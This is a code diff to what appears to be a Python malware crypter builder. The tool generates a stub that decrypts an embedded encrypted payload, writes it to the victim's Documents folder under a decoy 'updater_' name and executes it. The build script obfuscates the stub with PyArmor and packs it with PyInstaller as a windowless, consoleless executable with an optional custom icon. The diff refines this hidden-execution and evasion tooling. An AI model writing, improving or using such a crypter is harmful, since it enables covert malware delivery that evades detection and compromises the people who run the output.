@@ -73,6 +73,7 @@ $dependencies\n\tinstall all dependencies
         code = fr'''
 from cryptography.fernet import Fernet
 import os, sys
+import subprocess
 
 key = {key}
 f = Fernet(key)
@@ -93,7 +94,9 @@ decrypted_data = f.decrypt(encrypted_data)
 
 with open(r"C:\Users\\" + os.environ.get('USERNAME') + r"\Documents\updater_" + name, 'wb') as file:
     file.write(decrypted_data)
-os.system(r"C:\Users\\" + os.environ.get('USERNAME') + r"\Documents\updater_" + name)
+subprocess.call(r"C:\Users\\" + os.environ.get('USERNAME') + r"\Documents\updater_" + name)
+
+os._exit(0)
 '''
         
         batCode = fr'''
@@ -110,9 +113,9 @@ cd dist
 echo Progress: [40%%]
 '''
         if icon == "none":
-             batCode += fr'''pyinstaller -F -w --noconsole --add-data "pyarmor_runtime_000000;pyarmor_runtime_000000/" --add-data "../enc_{file_crypt_name};." --hidden-import "Fernet" --hidden-import "cryptography" --hidden-import "cryptography.fernet" "{name}.py" --windowed '''
+             batCode += fr'''pyinstaller -F -w --noconsole --add-data "pyarmor_runtime_000000;pyarmor_runtime_000000/" --add-data "../enc_{file_crypt_name};." --hidden-import "Fernet" --hidden-import "cryptography" --hidden-import "cryptography.fernet" "{name}.py"'''
         else:
-            batCode += fr'''pyinstaller -F -w --noconsole -i "{icon}" --add-data "pyarmor_runtime_000000;pyarmor_runtime_000000/" --add-data "../enc_{file_crypt_name};." --hidden-import "Fernet" --hidden-import "cryptography" --hidden-import "cryptography.fernet" "{name}.py" --windowed '''
+            batCode += fr'''pyinstaller -F -w --noconsole -i "{icon}" --add-data "pyarmor_runtime_000000;pyarmor_runtime_000000/" --add-data "../enc_{file_crypt_name};." --hidden-import "Fernet" --hidden-import "cryptography" --hidden-import "cryptography.fernet" "{name}.py"'''
 
         batCode += fr'''  
 cd dist  
